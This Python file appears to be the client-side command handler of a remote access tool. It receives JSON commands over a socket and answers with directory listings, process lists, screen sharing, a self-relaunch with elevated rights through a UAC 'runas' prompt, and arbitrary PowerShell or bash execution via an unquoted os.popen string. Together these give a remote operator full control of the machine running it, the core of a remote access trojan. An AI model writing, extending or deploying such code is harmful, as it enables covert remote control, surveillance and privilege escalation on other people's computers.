import json
import os
import psutil
import ctypes
import sys
from modules import screenshare

class CommandHandler:
    def handle(self, client, raw_data: str) -> None:
        try:
            data = json.loads(raw_data)
            cmd = data.get("data")
            match cmd:
                case "ls":
                    self.handle_ls(client, data.get("arguments"))
                case "exit":
                    client.close()
                    sys.exit(0)
                case "process":
                    self.handle_process(client)
                case "enableUac":
                    self.handle_enable_uac(client)
                case "terminal":
                    self.do_command(client, data.get("arguments"))
                case "ss":
                    screenshare.screenshare(client.send)
                case _:
                    print(f"Unknown command: {data}")
        except json.JSONDecodeError as e:
            print(f"JSON decode error: {e}")

    def handle_ls(self, client, arguments: str = None):
        if arguments is None:
            arguments = [os.path.expanduser("~")]

        if not os.path.exists(arguments[0]):
            client.send(json.dumps({
                "type": "command",
                "json_data": f"Path does not exist: {arguments[0]}"
            }))
            return

        files = [f for f in os.listdir(arguments[0]) if os.path.isfile(os.path.join(arguments[0], f))]
        folders = [f for f in os.listdir(arguments[0]) if os.path.isdir(os.path.join(arguments[0], f))]
        client.send(json.dumps({
            "type": "command",
            "json_data": {
                "files": files,
                "folders": folders,
            }
        }))

    def handle_process(self, client):
        processes = []
        for process in psutil.process_iter():
            try:
                processes.append({
                    "name": process.name(),
                    "pid": process.pid,
                    "memory_percent": process.memory_percent(),
                    "cpu_percent": process.cpu_percent(),
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        client.send(json.dumps({
            "command": "command",
            "json_data": processes
        }))

    def handle_enable_uac(self, client):
        if not ctypes.windll.shell32.IsUserAnAdmin():
            try:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                client.close()
                sys.exit(0)
            except Exception as e:
                client.send(json.dumps({
                    "command": "error",
                    "data": f"Failed to enable UAC: {str(e)}"
                }))
        else:
            client.send(json.dumps({
                "command": "error",
                "data": "UAC is already enabled"
            }))

    def do_command(self, client, commands = None):
        if commands is None:
            client.send(json.dumps({
                "type": "command",
                "json_data": "No command provided"
            }))
            return

        if os.name == "nt":
            shell = "powershell"
        else:
            shell = "bash"

        try:
            output = os.popen(f"{shell} -c {commands}").read()
            client.send(json.dumps({
                "type": "command",
                "json_data": output
            }))
        except Exception as e:
            client.send(json.dumps({
                "type": "command",
                "json_data": f"Failed to execute command: {str(e)}"
            }))
